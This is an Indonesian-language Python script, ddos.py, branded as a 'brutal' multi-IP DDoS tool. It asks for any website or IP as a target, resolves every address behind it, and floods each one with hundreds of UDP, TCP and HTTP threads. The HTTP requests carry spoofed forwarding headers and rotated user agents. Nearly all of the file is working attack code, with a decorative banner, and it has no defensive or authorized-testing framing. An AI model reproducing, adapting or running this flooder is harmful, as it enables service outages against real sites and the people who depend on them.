# lang: Python 3.11+, file: ddos.py
# build: pip install colorama dnspython
# usage: python ddos.py
# stop: Ctrl+C

import socket
import threading
import random
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor
try:
    import dns.resolver
    DNS_LIB = True
except ImportError:
    DNS_LIB = False
from colorama import Fore, Style, init

init(autoreset=True)

RUNNING = True

# ---- RAINBOW ----

def rainbow(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    out = ""
    i = 0
    for ch in text:
        if ch != ' ':
            out += colors[i % len(colors)] + Style.BRIGHT + ch
            i += 1
        else:
            out += ' '
    return out + Style.RESET_ALL

# ---- BEBEK LINUX ----

def tampil_bebek():
    bebek_lines = [
        r"        .88888888:.",
        r"       88888888.88888.",
        r"     .8888888888888888.",
        r"     888888888888888888",
        r"     88' _`88'_  `8888.",
        r"     88 88 88 88  88888",
        r"     88_88_::_88_:88888",
        r"     88:::,::,:::::8888",
        r"     88`:::::::::'`8888",
        r"    .88  `:::::'    8:88.",
        r"   8888            `8:888.",
        r" .8888'             `888888.",
        r".8888:..  .::.  ...:'8888888:.",
        r"8888.'     :'     `'::`88:88888",
        r"`8888;..  ;;;;.  ;;;; `88:88888",
        r" `8888888888888' 8888  88:88888",
        r"  `.8888888888'  8888  88888888",
    ]
    colors = [Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.YELLOW, Fore.GREEN]
    for idx, line in enumerate(bebek_lines):
        print(colors[idx % len(colors)] + Style.BRIGHT + line)
        time.sleep(0.03)
    print()

# ---- BANNER ----

def tampil_banner():
    baris = [
        "███╗   ███╗██████╗ ██╗  ██╗ ██╗██╗  ██╗███╗   ██╗      ██╗██████╗ ",
        "████╗ ████║██╔══██╗ ██╗██╔╝ ██║██║  ██║████╗  ██║      ██║██╔══██╗",
        "██╔████╔██║██████╔╝  ████╔╝  ██║███████║██╔██╗ ██║      ██║██║  ██║",
        "██║╚██╔╝██║██╔══██╗ ██╔╝██╗  ╚═╝╚════██║██║╚██╗██║      ██║██║  ██║",
        "██║ ╚═╝ ██║██║  ██║██╔╝  ██╗ ██╗     ██║██║ ╚████║      ██║██████╔╝",
        "╚═╝     ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝ ╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝",
    ]
    print()
    for line in baris:
        print(rainbow(line))
        time.sleep(0.06)
    print()

def tampil_ddos():
    ddos_baris = [
        "██████╗ ██████╗  ██████╗ ███████╗",
        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
        "██║  ██║██║  ██║██║   ██║███████╗",
        "██║  ██║██║  ██║██║   ██║╚════██║",
        "██████╔╝██████╔╝╚██████╔╝███████║",
        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝",
    ]
    for line in ddos_baris:
        print(Fore.CYAN + Style.BRIGHT + line)
        time.sleep(0.06)
    print()

# ---- LOADING ----

def loading_bar(teks, durasi=1.2):
    bar_len = 40
    start = time.time()
    while True:
        elapsed = time.time() - start
        ratio = min(elapsed / durasi, 1.0)
        filled = int(bar_len * ratio)
        bar = "█" * filled + "░" * (bar_len - filled)
        pct = int(ratio * 100)
        sys.stdout.write(
            f"\r{Fore.GREEN}[{Fore.YELLOW}{bar}{Fore.GREEN}] "
            f"{Fore.WHITE}{Style.BRIGHT}{pct}% {Fore.CYAN}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        if ratio >= 1.0:
            break
        time.sleep(0.02)
    print()

def spinner(teks, durasi=1.0):
    chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    end = time.time() + durasi
    i = 0
    while time.time() < end:
        sys.stdout.write(
            f"\r{Fore.MAGENTA}[{chars[i % len(chars)]}] "
            f"{Fore.WHITE}{Style.BRIGHT}{teks}{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        time.sleep(0.07)
        i += 1
    print()

# ---- RESOLVE SEMUA IP ----

def resolve_semua_ip(host):
    ips = set()

    # method 1: dnspython — paling lengkap
    if DNS_LIB:
        try:
            hasil = dns.resolver.resolve(host, 'A')
            for r in hasil:
                ips.add(r.address)
        except Exception:
            pass

    # method 2: getaddrinfo — fallback
    try:
        hasil = socket.getaddrinfo(host, None)
        for r in hasil:
            ip = r[4][0]
            if ':' not in ip:  # skip IPv6
                ips.add(ip)
    except Exception:
        pass

    # method 3: gethostbyname_ex — kadang balik lebih dari 1
    try:
        _, _, addr_list = socket.gethostbyname_ex(host)
        for ip in addr_list:
            ips.add(ip)
    except Exception:
        pass

    return list(ips)

# ---- INPUT ----

def input_interaktif():
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL — AUTO MULTI-IP ⚡")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

    while True:
        raw = input(
            f"{Fore.YELLOW}{Style.BRIGHT}  [?] MASUKKAN LINK / IP TARGET{Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
        ).strip()
        print(Style.RESET_ALL, end="")
        if not raw:
            print(Fore.RED + "  [!] Target tidak boleh kosong.")
            continue
        host = raw.replace("https://","").replace("http://","").split("/")[0]

        spinner(f"Resolving semua IP dari {host}...", 1.5)
        ips = resolve_semua_ip(host)

        if not ips:
            print(Fore.RED + f"  [!] Gagal resolve {host}. Coba lagi.")
            continue

        # tampil semua IP yang ketemu
        print()
        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
        print(Fore.GREEN + Style.BRIGHT + f"  [✓] Ditemukan {len(ips)} IP:")
        for idx, ip in enumerate(ips, 1):
            print(f"{Fore.CYAN}      [{idx}] {Fore.RED}{Style.BRIGHT}{ip}")
        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
        print()
        break

    port_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PORT {Fore.WHITE}(default 80){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    port = int(port_raw) if port_raw.isdigit() else 80

    print(f"{Fore.YELLOW}{Style.BRIGHT}  [?] MODE SERANGAN:")
    print(f"{Fore.CYAN}      [1] UDP  — saturasi bandwidth")
    print(f"{Fore.CYAN}      [2] TCP  — banjiri connection table")
    print(f"{Fore.CYAN}      [3] HTTP — pukul CPU server")
    print(f"{Fore.CYAN}      [4] MIX  — semua sekaligus (paling brutal)")
    mode_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PILIH {Fore.WHITE}(1/2/3/4, default 4){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    mode_map_input = {"1":"udp","2":"tcp","3":"http","4":"mix"}
    mode = mode_map_input.get(mode_raw, "mix")

    thr_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] JUMLAH THREAD {Fore.WHITE}(default 500){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    threads = int(thr_raw) if thr_raw.isdigit() else 500

    ukuran_raw = input(
        f"{Fore.YELLOW}{Style.BRIGHT}  [?] UKURAN PAYLOAD {Fore.WHITE}(bytes, default 65000){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
    ).strip()
    print(Style.RESET_ALL, end="")
    ukuran = int(ukuran_raw) if ukuran_raw.isdigit() else 65000

    return host, ips, port, mode, threads, ukuran

# ---- TAMPIL INFO ----

def tampil_info(host, ips, port, mode, threads, ukuran):
    per_ip = threads // len(ips)
    print()
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN MULTI-IP DIMULAI — CTRL+C UNTUK STOP 💀")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print(f"{Fore.YELLOW}  [»] HOST        : {Fore.RED}{Style.BRIGHT}{host}")
    for idx, ip in enumerate(ips, 1):
        print(f"{Fore.YELLOW}  [»] IP [{idx}]      : {Fore.RED}{Style.BRIGHT}{ip}")
    print(f"{Fore.YELLOW}  [»] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
    print(f"{Fore.YELLOW}  [»] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
    print(f"{Fore.YELLOW}  [»] TOTAL THREAD: {Fore.RED}{Style.BRIGHT}{threads}")
    print(f"{Fore.YELLOW}  [»] THREAD/IP   : {Fore.RED}{Style.BRIGHT}{per_ip}")
    print(f"{Fore.YELLOW}  [»] PAYLOAD     : {Fore.RED}{Style.BRIGHT}{ukuran} bytes")
    print(f"{Fore.YELLOW}  [»] DELAY       : {Fore.RED}{Style.BRIGHT}0.01s")
    print(f"{Fore.YELLOW}  [»] STOP        : {Fore.GREEN}{Style.BRIGHT}Ctrl+C")
    print(f"{Fore.YELLOW}  [»] STATUS      : {Fore.GREEN}{Style.BRIGHT}⚡ ALL IP DISERANG SEKALIGUS ⚡")
    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
    print()

# ---- STATS PER IP ----

stats_per_ip = {}
lock = threading.Lock()

def init_stats(ips):
    for ip in ips:
        stats_per_ip[ip] = {"kirim": 0, "error": 0, "bytes": 0}

# ---- FLOOD FUNCTIONS ----

def udp_flood(ip, port, ukuran):
    global RUNNING
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    tujuan = (ip, port)
    while RUNNING:
        try:
            sock.sendto(random.randbytes(ukuran), tujuan)
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += ukuran
        except Exception:
            with lock:
                stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)
    sock.close()

def tcp_flood(ip, port, ukuran):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.sendall(random.randbytes(ukuran))
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += ukuran
        except Exception:
            with lock:
                stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

def http_flood(ip, port, ukuran):
    global RUNNING
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36",
        "curl/8.4.0",
        "python-requests/2.31.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]
    paths = [
        "/", "/index.php", "/login", "/admin", "/wp-admin",
        "/api/v1/users", "/search?q=" + "A"*256,
        "/.env", "/config.php", "/backup.zip",
        "/api/data?id=" + "1"*128, "/xmlrpc.php",
        "/?a=" + "X"*512,
    ]
    rnd_ip = lambda: (
        f"{random.randint(1,254)}.{random.randint(1,254)}."
        f"{random.randint(1,254)}.{random.randint(1,254)}"
    )
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            ua   = random.choice(uas)
            path = random.choice(paths)
            req  = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*\r\n"
                f"Accept-Language: id-ID,id;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Forwarded-For: {rnd_ip()}\r\n"
                f"X-Real-IP: {rnd_ip()}\r\n"
                f"X-Originating-IP: {rnd_ip()}\r\n"
                f"Referer: https://www.google.com/\r\n\r\n"
            ).encode()
            s.sendall(req)
            s.close()
            with lock:
                stats_per_ip[ip]["kirim"] += 1
                stats_per_ip[ip]["bytes"] += len(req)
        except Exception:
            with lock:
                stats_per_ip[ip]["error"] += 1
        time.sleep(0.01)

# ---- STATISTIK LIVE MULTI-IP ----

def cetak_statistik(ips, port, mode):
    global RUNNING
    bar_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
    skulls = ["💀","👾","⚡","🔥","💥"]
    tick  = 0
    start = time.time()

    while RUNNING:
        with lock:
            snapshot = {ip: dict(stats_per_ip[ip]) for ip in ips}

        elapsed = max(0.1, time.time() - start)
        bc = bar_colors[tick % len(bar_colors)]
        sk = skulls[tick % len(skulls)]

        # hitung total
        total_kirim = sum(s["kirim"] for s in snapshot.values())
        total_error = sum(s["error"] for s in snapshot.values())
        total_bytes = sum(s["bytes"] for s in snapshot.values())
        total_pps   = total_kirim / elapsed
        total_mbps  = (total_bytes * 8) / (elapsed * 1_000_000)

        # clear beberapa baris — 1 baris per IP + 2 baris header
        lines = len(ips) + 2
        sys.stdout.write(f"\033[{lines}A\033[J")

        # header total
        print(
            f"{bc}{Style.BRIGHT}{sk} TOTAL "
            f"{Fore.WHITE}│ {Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{total_kirim:,} "
            f"{Fore.WHITE}│ {Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{total_pps:,.0f} "
            f"{Fore.WHITE}│ {Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{total_mbps:.2f} "
            f"{Fore.WHITE}│ {Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{total_error:,} "
            f"{Fore.WHITE}│ {Fore.YELLOW}WAKTU:{Fore.WHITE}{Style.BRIGHT}{elapsed:.0f}s"
            f"{Style.RESET_ALL}"
        )
        print(Fore.WHITE + Style.BRIGHT + "─" * 65 + Style.RESET_ALL)

        # per IP
        for ip in ips:
            s    = snapshot[ip]
            pps  = s["kirim"] / elapsed
            mbps = (s["bytes"] * 8) / (elapsed * 1_000_000)
            print(
                f"  {Fore.RED}{Style.BRIGHT}{ip:<18}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{s['kirim']:>8,}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:>8,.0f}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:>6.2f}{Style.RESET_ALL} "
                f"{Fore.CYAN}│{Style.RESET_ALL} "
                f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{s['error']:>6,}{Style.RESET_ALL}"
            )

        tick += 1
        time.sleep(0.25)

# ---- MAIN ----

if __name__ == "__main__":
    os.system("clear" if os.name == "posix" else "cls")

    tampil_bebek()
    tampil_banner()
    tampil_ddos()

    loading_bar("Memuat sistem senjata...", 1.2)
    loading_bar("Menyiapkan payload brutal...", 1.0)
    spinner("Mengaktifkan mode multi-target...", 0.8)

    print()
    host, ips, port, mode, threads, ukuran = input_interaktif()

    loading_bar("Mengunci semua target...", 1.2)
    spinner("Membuka semua jalur serangan...", 0.8)

    tampil_info(host, ips, port, mode, threads, ukuran)

    # init stats per IP
    init_stats(ips)

    # print placeholder baris statistik
    lines = len(ips) + 2
    for _ in range(lines):
        print()

    # stat thread
    stat_thread = threading.Thread(
        target=cetak_statistik,
        args=(ips, port, mode),
        daemon=True
    )
    stat_thread.start()

    # hitung thread per IP
    per_ip = max(1, threads // len(ips))

    flood_map = {
        "udp":  udp_flood,
        "tcp":  tcp_flood,
        "http": http_flood,
    }

    try:
        with ThreadPoolExecutor(max_workers=threads + 10) as pool:
            futures = []
            for ip in ips:
                if mode == "mix":
                    per_mode = max(1, per_ip // 3)
                    for fn in [udp_flood, tcp_flood, http_flood]:
                        for _ in range(per_mode):
                            futures.append(pool.submit(fn, ip, port, ukuran))
                else:
                    fn = flood_map[mode]
                    for _ in range(per_ip):
                        futures.append(pool.submit(fn, ip, port, ukuran))
            for f in futures:
                try:
                    f.result()
                except Exception:
                    pass

    except KeyboardInterrupt:
        RUNNING = False
        time.sleep(0.5)
        print(f"\n\n{Fore.RED}{Style.BRIGHT}{'═'*65}")
        print(f"  [✋] DIHENTIKAN")
        total_k = sum(s["kirim"] for s in stats_per_ip.values())
        total_e = sum(s["error"] for s in stats_per_ip.values())
        total_b = sum(s["bytes"] for s in stats_per_ip.values())
        for ip in ips:
            s = stats_per_ip[ip]
            print(f"  [{ip}] kirim: {s['kirim']:,} | error: {s['error']:,}")
        print(f"  [»] TOTAL KIRIM : {total_k:,}")
        print(f"  [»] TOTAL ERROR : {total_e:,}")
        print(f"  [»] TOTAL DATA  : {total_b/1_000_000:.2f} MB")
        print(f"{'═'*65}{Style.RESET_ALL}")
        import sys; sys.exit(0)
